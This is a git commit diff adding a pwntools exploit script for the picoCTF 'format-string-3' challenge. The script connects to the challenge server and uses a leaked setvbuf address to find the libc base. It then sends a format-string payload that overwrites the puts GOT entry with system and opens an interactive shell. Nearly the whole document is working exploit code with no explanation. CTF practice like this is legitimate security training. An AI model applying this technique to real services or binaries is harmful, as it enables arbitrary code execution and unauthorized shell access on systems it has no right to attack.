adc122e8c042c3ab7788491ebd8db9ca9496ba95
Lqnk4 <internalbeast109@gmail.com>
2024-11-11 09:51:45 -0800

    format-string-3

--- format_string_3/main.py
+++ format_string_3/main.py
@@ -1,15 +1,21 @@
 from pwn import *
 
 context.log_level = "critical"
-context.binary = ELF('format-string-3')
+context.arch = "amd64"
+context.os = "linux"
+context.binary = ELF("format-string-3")
+libc = context.binary.libc
 
-p = process("./format-string-3")
+p = remote("rhea.picoctf.net", 64043)
 
-def exec_fmt(payload):
-    p = process("./format-string-3")
-    log.info("payload = %s" % repr(payload))
-    p.sendline(payload)
-    return p.recvall()
+p.recvline()  # Howdy
+s = p.recvline().split(b" ")  # I'll be nice
+stevbuf_addr = int(s[-1].decode("utf-8").strip(), 16)  # &setvbuf
 
-s = p.recvall()
+static_setvbuf = libc.symbols["setvbuf"]
+libc.address = stevbuf_addr - static_setvbuf
 
+payload = fmtstr_payload(38, {context.binary.got["puts"]: libc.symbols["system"]})
+
+p.sendline(payload)
+p.interactive()
